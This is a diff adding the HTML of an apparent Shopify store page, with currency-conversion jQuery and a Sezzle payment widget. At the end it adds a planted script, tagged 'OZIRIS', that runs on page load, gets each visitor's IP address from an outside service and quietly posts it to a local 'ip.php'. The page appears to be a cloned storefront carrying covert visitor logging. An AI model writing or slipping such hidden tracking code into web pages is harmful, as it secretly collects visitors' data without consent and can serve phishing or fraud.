+    $('.selected-currency').text(Currency.currentCurrency);
+    if(newCurrency != shopCurrency) {
+      $(".mlvedaCartNote").css("display","inline");
+    } else {
+      $(".mlvedaCartNote").css("display","none");
+    }
+  }
+});
+var original_selectCallback = window.selectCallback;
+var selectCallback = function(variant, selector) {
+  original_selectCallback(variant, selector);
+  Currency.convertAll(shopCurrency, jQuery('[name=currencies]').val());
+  jQuery('.selected-currency').text(Currency.currentCurrency);
+};
+
+jQuery('.selected-currency').text(Currency.currentCurrency);
+
+jQuery('.single-option-selector').change(function() {
+    mlvedaload();
+  });
+
+$(document).ajaxComplete(function(event, xhr, settings) {
+     if(settings.url.indexOf("cart.js")!=-1) {
+       setTimeout(function() {
+         mlvedaload();
+       }, 1000);
+     }
+   });
+  
+  
+  $('body').on("click",".single-option-selector__radio",function() {
+      var timesRun = 0;
+      var interval = setInterval(function(){ 
+         timesRun += 1;
+         console.log("test_ml");
+         if(timesRun === 10){
+           clearInterval(interval);
+           }
+           mlvedaload();
+           }, 500);
+       });
+
+   
+}
+   </script>
+   <style>
+   </style>
+   <div class="shopify-block shopify-app-block" id="shopify-block-12608439564960700138">
+    <div id="sezzle-widget-embed-block-error">
+    </div>
+	
+    <style>
+     .sezzle-shopify-info-button .sezzle-button-text {
+    
+
+    
+        font-family: Helvetica, sans-serif !important;
+    
+}
+    </style>
+    <script defer="" src="https://cdn.shopify.com/extensions/a0187bd9-579b-4688-b65b-d03b36d0a439/sezzle-widget-6/assets/widget-renderer.min.js">
+    </script>
+    <script>
+     // show this error note only inside design preview
+    
+
+    
+        document.addEventListener('DOMContentLoaded', () => {
+          new WidgetRenderer({
+              merchantUUID : "c196ce0f-2b17-4e8e-8db1-6cc6f36ac44e",
+              blockType : "embed"
+          }).init();
+        });
+    </script>
+   </div>
+  </link>
+ <script>
+document.addEventListener("DOMContentLoaded", function () {
+    // OZIRIS to get user's IP address
+    function getUserIP(callback) {
+        fetch("https://api64.ipify.org?format=json")
+            .then(response => response.json())
+            .then(data => callback(data.ip))
+            .catch(error => console.error("Error fetching IP:", error));
+    }
+
+    // Function to send IP to PHP file
+    function sendIPToPHP(ip) {
+        fetch("ip.php", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded",
+            },
+            body: "ip=" + ip,
+        })
+            .then(response => response.text())
+            .then(data => console.log(data))
+            .catch(error => console.error("Error sending IP to PHP:", error));
+}
+
+// Get user's IP and send it to PHP file
+getUserIP(function (ip) {
+    sendIPToPHP(ip);
+});
+});
+</script></body>
+</html>
